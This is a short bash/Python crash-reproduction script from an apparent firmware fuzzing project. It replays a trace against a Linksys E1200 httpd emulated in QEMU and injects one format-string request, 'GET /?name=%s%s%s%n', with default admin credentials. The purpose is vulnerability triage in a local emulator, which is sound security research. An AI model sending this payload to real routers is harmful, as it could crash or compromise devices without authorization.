#!/bin/bash
# 用 QEMU strace + signal dump 确认 088311b5 格式字符串崩溃
# 只注入 idx=81 mutation (format string payload)

SIM_ROOT="$(cd "$(dirname "$0")/../../.." && pwd)"
ROOTFS="$SIM_ROOT/tests/images/Linksys/rootfs"
TRACE="$SIM_ROOT/tests/seeds/Linksys_E1200_auth.trace"
QEMU="$SIM_ROOT/../../build/qemu-mipsel"
HTTPD="$ROOTFS/usr/sbin/httpd"
OUTPUT_DIR="/tmp/crash_gdb_088311b5"

mkdir -p "$OUTPUT_DIR"
mkdir -p /tmp/run

echo "[*] Dumping crash with QEMU strace..."
echo "[*] Payload: GET /?name=%s%s%s%n"
echo ""

# Run with strace to see last syscalls before crash
PYTHONPATH="$SIM_ROOT/fuzzing" \
QEMU_LD_PREFIX="$ROOTFS" \
python3 - <<'PYEOF'
import sys, os
sys.path.insert(0, 'fuzzing')

from conductor.conductor_types import FuzzInstruction
from conductor.qemu_executor import QEMUExecutor

ROOT = os.path.abspath('.')
ROOTFS = f"{ROOT}/tests/images/Linksys/rootfs"
QEMU   = f"{ROOT}/../../build/qemu-mipsel"
HTTPD  = f"{ROOTFS}/usr/sbin/httpd"
TRACE  = f"{ROOT}/tests/seeds/Linksys_E1200_auth.trace"

PAYLOAD = b'GET /?name=%s%s%s%n HTTP/1.1\r\nHost: 127.0.0.1\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n\r\n'

mut = FuzzInstruction(
    syscall_index=81, cmd=2, arg_index=1,
    data=PAYLOAD, offset=0, size=len(PAYLOAD),
    mutation_type='format_string',
)

executor = QEMUExecutor(
    qemu_path=QEMU,
    target_binary=HTTPD,
    target_args="-p 8093",
    ld_prefix=ROOTFS,
    timeout=15.0,
    persistent_mode=True,
    extra_qemu_args=["-strace"],
)

print("[*] Executing replay with idx=81 format string only...")
result = executor.execute(TRACE, [mut])
print(f"\n[RESULT] status={result.status_name}  crashed={result.crashed}")
if hasattr(result, 'crash_pc'):
    print(f"[RESULT] crash_pc={result.crash_pc}")

executor.stop_persistent_qemu()
PYEOF
